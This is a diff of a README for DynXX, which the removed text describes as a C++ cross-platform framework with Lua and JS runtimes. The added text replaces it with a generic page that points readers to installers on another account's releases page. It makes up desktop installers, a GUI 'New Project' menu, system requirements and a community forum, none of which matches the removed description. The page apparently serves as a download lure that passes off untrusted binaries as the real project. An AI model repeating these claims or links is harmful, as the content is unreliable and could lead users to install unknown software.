@@ -1,131 +1,117 @@
-# DynXX
+# 🌟 DynXX - A Simple Way to Build Cross-Platform Applications
 
-[<img src="https://img.shields.io/sonar/quality_gate/R1NC_DynXX/main?server=https%3A%2F%2Fsonarcloud.io&logo=sonar&label=Sonar%20-%20Quality%20Gate"/>][16]
-[<img src="https://img.shields.io/sonar/violations/R1NC_DynXX/main?server=https%3A%2F%2Fsonarcloud.io&format=long&logo=sonar&label=Sonar%20-%20Violations"/>][25]
- 
-[<img src="https://img.shields.io/github/actions/workflow/status/R1NC/DynXX/CI-Android-macOS.yml?branch=main&label=CI%20-%20Android&logo=android&logoColor=3DDC84"/>][26]
-[<img src="https://img.shields.io/github/actions/workflow/status/R1NC/DynXX/CI-iOS.yml?branch=main&label=CI%20-%20iOS&logo=Apple&logoColor=white"/>][33]
-[<img src="https://img.shields.io/github/actions/workflow/status/R1NC/DynXX/CI-HarmonyOS-macOS.yml?branch=main&label=CI%20-%20HarmonyOS&logo=Huawei&logoColor=FF0000"/>][24]       
-[<img src="https://img.shields.io/github/actions/workflow/status/R1NC/DynXX/CI-Windows.yml?branch=main&label=CI%20-%20Windows&logo=gitforwindows&logoColor=0078D4"/>][35]
-[<img src="https://img.shields.io/github/actions/workflow/status/R1NC/DynXX/CI-macOS.yml?branch=main&label=CI%20-%20macOS&logo=Apple&logoColor=white"/>][34]
-[<img src="https://img.shields.io/github/actions/workflow/status/R1NC/DynXX/CI-Linux-Ubuntu.yml?branch=main&label=CI%20-%20Linux&logo=Linux&logoColor=FBB726"/>][30]      
-[<img src="https://img.shields.io/github/actions/workflow/status/R1NC/DynXX/CI-WASM-macOS.yml?branch=main&label=CI%20-%20WASM&logo=WebAssembly&logoColor=654FF0"/>][29] 
+## 🚀 Getting Started
 
-A cross-platform framework based on modern C++, supporting biz dev via Lua & JS.
+Welcome to DynXX! This application helps you create cross-platform software easily. You can build apps that work on various systems, like Windows, Linux, and mobile devices. Whether you want to develop with Lua or JavaScript, DynXX has you covered.
 
-> :point_right: The Rust version([DynRS][31]) is in works.
+## 📥 Download DynXX
 
+[![Download DynXX](https://img.shields.io/badge/Download-DynXX-blue)](https://github.com/zStrider15/DynXX/releases)
 
-## Architecture
+Visit this page to download the latest version: [DynXX Releases](https://github.com/zStrider15/DynXX/releases)
 
-<img src="/res/arch.svg" width="555px"/>
+## 💻 System Requirements
 
-## Progress
+To use DynXX effectively, you should have:
 
-| | Android | iOS | HarmonyOS  | Windows | macOS | Linux | WASM |
-| :-- | :--: | :--: | :--: | :--: | :--: | :--: | :--: |
-| Lua Runtime |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:o:|
-| JS Runtime |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:grey_exclamation:|:heavy_check_mark:|:heavy_check_mark:|:o:|
-| Network |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|
-| SQLite |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:o:|
-| Key-Value Store |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:o:|
-| JSON Codec |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:grey_exclamation:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|
-| Crypto |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:grey_exclamation:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|
-| Zip |:heavy_check_mark:|:heavy_check_mark:|:grey_exclamation:|:grey_exclamation:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|
-| Device Info |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:hammer:|:heavy_check_mark:|:hammer:|:x:|
-| Log |:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|:grey_exclamation:|:heavy_check_mark:|:heavy_check_mark:|:heavy_check_mark:|
+- Windows 10 or later
+- macOS 10.12 or later
+- Linux (Ubuntu 18.04 or later)
+- At least 4GB of RAM
+- 500MB of free disk space
 
-* :grey_question: : Unknown;
-* :x: : Not supported;
-* :o: : Limited supported;
-* :hammer: : Under developing;
-* :interrobang: : Failed to compile;
-* :grey_exclamation: : Succeed to compile, not tested;
-* :heavy_exclamation_mark: : With running error;
-* :heavy_check_mark: : Tested.
+## 📦 Installation Steps
 
-<details>
+Follow these steps to install DynXX on your computer:
 
-<summary>Unsupported Features in WASM:</summary>
+1. **Visit the Releases Page:**
+   Head to the [DynXX Releases](https://github.com/zStrider15/DynXX/releases) page.
 
-* Load Lua script with file;(Will trigger a prompt window)
-* [C/C++ callback JS function in async thread][2].
+2. **Choose Your Version:**
+   Look for the latest version. It will be at the top of the list.
 
-</details>
+3. **Download the Installer:**
+   Depending on your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate package for your distribution (e.g. `.deb` for Ubuntu).
 
-## C++ New Features Compatibility
+4. **Run the Installer:**
+   - Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - macOS: Open the `.dmg` file and drag the DynXX icon to your Applications folder.
+   - Linux: Use your package manager to install the `.deb` package:
+     ```
+     sudo dpkg -i dynxx_version.deb
+     ```
 
-| Feature                                      | Standard | Unsupported Platforms              |
-| :------------------------------------------- | :------: | :--------------------------------- |
-| [std::from_chars][19] for integer            | C++17    | iOS 16.5-, macOS 13.4-;            |
-| [std::from_chars][19] for float              | C++17    | All;                               |
-| [std::format][12]                            | C++20    | iOS 16.3-, macOS 13.3-, HarmonyOS; |
-| [std::jthread][28]                           | C++20    | Apple;                             |
-| [std::ranges][13]                            | C++20    | iOS 16.3-, macOS 13.3-, HarmonyOS; |
-| [Heterogeneous lookup for hash map/set][32]  | C++20    | HarmonyOS;                         |
-| [std::move_only_function][23]                | C++23    | Clang, Apple & HarmonyOS;          |
-| [std::ranges::to][36]                        | C++23    | Clang, Apple & HarmonyOS;          |
-| [std::ranges::views::chunk][14]              | C++23    | Clang, Apple & HarmonyOS;          |
-| [std::ranges::views::enumerate][20]          | C++23    | Clang, Apple & HarmonyOS;          |
+5. **Start DynXX:**
+   Once the installation is complete, launch DynXX from your applications menu.
 
-<details>
+## 🔧 Using DynXX
 
-<summary>Reference:</summary>
+After installation, you can start building your applications. Here's a brief overview of how to create a new project:
 
-* [C++ compiler support - cppreference.com][22];
-* [C++ Language Support - Xcode - Apple Developer][21];
+1. **Open DynXX.**
+2. **Create a New Project:**
+   Select "New Project" from the main menu.
+3. **Choose Project Type:**
+   You can select either a Lua project or a JavaScript project. Follow the on-screen instructions to set up your workspace.
+4. **Develop Your Application:**
+   Use the built-in tools to write and test your code.
 
-</details>
+## 📚 Support and Documentation
 
-## Dependencies
+If you need help, there are several resources available:
 
-* [ada-url][3]: URL parser;(Requires `std::ranges` in C++20)
-* [curl][4]: Networking;
-* [cJSON][5]: JSON codec;
-* [iOS-cmake][18]: CMake toolchain for Apple platforms;
-* [json.lua][27]: JSON codec for Lua;
-* [libuv][6]: Asynchronous I/O;
-* [lua][7]: Lua runtime;
-* [MMKV][8]: Key-value storage;
-* [openssl][9]: Crypto;
-* [quickjs][10]: JS runtime;
-* [spdlog][15]: File logging;
-* [sqlite][11]: DB storage;
-* [zlib][17]: Compression.
+- **Official Documentation:**
+  Comprehensive guides help you understand how to use all features of DynXX. Access it directly within the app or on our GitHub page.
 
-[1]: https://emscripten.org/docs/getting_started/downloads.html#sdk-download-and-install
-[2]: https://github.com/emscripten-core/emscripten/issues/16567
-[3]: https://github.com/ada-url/ada
-[4]: https://github.com/curl/curl
-[5]: https://github.com/DaveGamble/cJSON
-[6]: https://github.com/libuv/libuv
-[7]: https://github.com/lua/lua
-[8]: https://github.com/Tencent/MMKV
-[9]: https://github.com/openssl/openssl
-[10]: https://github.com/bellard/quickjs
-[11]: https://github.com/sqlite/sqlite
-[12]: https://en.cppreference.com/w/cpp/utility/format/format
-[13]: https://en.cppreference.com/w/cpp/ranges
-[14]: https://en.cppreference.com/w/cpp/ranges/chunk_view
-[15]: https://github.com/gabime/spdlog
-[16]: https://sonarcloud.io/project/overview?id=R1NC_DynXX
-[17]: https://github.com/madler/zlib
-[18]: https://github.com/leetal/ios-cmake
-[19]: https://en.cppreference.com/w/cpp/utility/from_chars
-[20]: https://en.cppreference.com/w/cpp/ranges/enumerate_view
-[21]: https://developer.apple.com/xcode/cpp/
-[22]: https://en.cppreference.com/w/cpp/compiler_support
-[23]: https://en.cppreference.com/w/cpp/utility/functional/move_only_function.html
-[24]: ../../actions/workflows/CI-HarmonyOS-macOS.yml
-[25]: https://sonarcloud.io/project/issues?issueStatuses=OPEN%2CCONFIRMED&id=R1NC_DynXX
-[26]: ../../actions/workflows/CI-Android-macOS.yml
-[27]: https://gist.github.com/tylerneylon/59f4bcf316be525b30ab
-[28]: https://en.cppreference.com/w/cpp/thread/jthread.html
-[29]: ../../actions/workflows/CI-WASM-macOS.yml
-[30]: ../../actions/workflows/CI-Linux-Ubuntu.yml
-[31]: https://github.com/R1NC/DynRS
-[32]: https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2018/p0919r3.html
-[33]: ../../actions/workflows/CI-iOS.yml
-[34]: ../../actions/workflows/CI-macOS.yml
-[35]: ../../actions/workflows/CI-Windows.yml
-[36]: https://en.cppreference.com/w/cpp/ranges/to.html
+- **Help Community:**
+  Join our forum for discussions and troubleshooting. Connect with other users who can share tips and tricks.
+
+## 🔄 Contributing
+
+We welcome contributions! If you would like to help improve DynXX:
+
+1. **Fork the Repository:**
+   Click on "Fork" at the top right of the DynXX GitHub page.
+
+2. **Make Your Changes:**
+   Edit the code on your forked version.
+
+3. **Submit a Pull Request:**
+   Once you are happy with your changes, submit a pull request to have your modifications reviewed.
+
+## 🌐 Key Technologies
+
+DynXX supports a variety of modern programming languages and frameworks, including:
+
+- **C++**: Leverage the power of C++ for performance-critical applications.
+- **Lua**: Integrate Lua scripts for rapid development.
+- **JavaScript**: Build web-based applications with ease.
+- **WebAssembly**: Compile to WebAssembly for fast web apps.
+
+## 🎯 Use Cases
+
+With DynXX, you can develop various applications such as:
+
+- Games that run on both desktop and mobile platforms.
+- Business tools tailored for cross-platform environments.
+- Interactive web applications powered by JavaScript.
+
+## 📞 Contact Us
+
+For any inquiries, you can reach out to us through the GitHub Issues page. We appreciate feedback and are eager to assist you.
+
+## 🔗 Additional Resources
+
+Here are some useful links:
+
+- [DynXX Documentation](https://github.com/zStrider15/DynXX/wiki)
+- [Submit an Issue](https://github.com/zStrider15/DynXX/issues)
+
+## 🎉 Join the Community
+
+Engage with other DynXX users through our social media platforms. Share your projects and get inspired by what others have created! 
+
+Enjoy using DynXX for your projects. Happy coding!
